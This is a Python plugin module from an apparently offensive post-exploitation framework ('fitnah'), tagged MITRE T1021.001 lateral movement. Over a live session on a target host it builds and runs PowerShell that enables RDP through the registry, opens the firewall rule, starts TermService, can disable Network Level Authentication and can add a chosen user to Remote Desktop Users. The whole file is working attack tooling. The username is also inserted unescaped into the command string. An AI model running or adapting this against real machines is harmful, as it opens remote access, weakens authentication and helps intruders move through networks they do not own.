"""lateral_movement/rdp_enable — enable RDP, open FW, add user to RDPUsers. MITRE T1021.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class RdpEnable(BasePlugin):
    NAME        = "rdp_enable"
    DESCRIPTION = "Enable RDP (reg + FW + service), add user to Remote Desktop Users, NLA toggle."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1021.001"
    CATEGORY    = "lateral_movement"
    schema      = ParamSchema().add(
        Param("disable",     bool, required=False, default=False, help="Disable RDP instead"),
        Param("add_user",    str,  required=False, default="",
              help="Add this username to Remote Desktop Users group"),
        Param("disable_nla", bool, required=False, default=False,
              help="Disable Network Level Authentication (allows any-version RDP client)"),
    )

    @mitre("T1021.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        disable     = params.get("disable", False)
        add_user    = params.get("add_user", "").strip()
        disable_nla = params.get("disable_nla", False)

        val    = 1 if disable else 0
        fw_en  = "No" if disable else "Yes"
        action = "DISABLED" if disable else "ENABLED"

        ps = (
            # Registry: fDenyTSConnections
            "try {"
            f"  Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'"
            f"    -Name fDenyTSConnections -Value {val} -EA Stop;"
            f"  Write-Output '[+] fDenyTSConnections = {val}'"
            "} catch { Write-Output \"[-] Registry: $_\" };"

            # Firewall
            + f"netsh advfirewall firewall set rule group=\"remote desktop\" new enable={fw_en} 2>&1 | Out-String | ForEach-Object {{ \"FW: $_\" }};"

            # Enable TermService
            + (
                "try { Set-Service TermService -StartupType Automatic -EA Stop; Start-Service TermService -EA Stop; Write-Output '[+] TermService started' } catch { Write-Output \"[-] TermService: $_\" };"
                if not disable else
                "try { Stop-Service TermService -Force -EA SilentlyContinue; Write-Output '[+] TermService stopped' } catch {}"
            )

            # NLA
            + (
                "try {"
                "  Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp'"
                "    -Name UserAuthentication -Value 0 -EA Stop;"
                "  Write-Output '[+] NLA disabled (UserAuthentication=0)'"
                "} catch { Write-Output \"[-] NLA: $_\" };"
                if disable_nla else ""
            )

            # Add user to Remote Desktop Users group
            + (
                f"try {{"
                f"  Add-LocalGroupMember -Group 'Remote Desktop Users' -Member '{add_user}' -EA Stop;"
                f"  Write-Output '[+] Added {add_user} to Remote Desktop Users'"
                f"}} catch {{ Write-Output \"[-] Add user: $_\" }};"
                if add_user else ""
            )

            + f"Write-Output 'RDP: {action}  Port: 3389'"
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
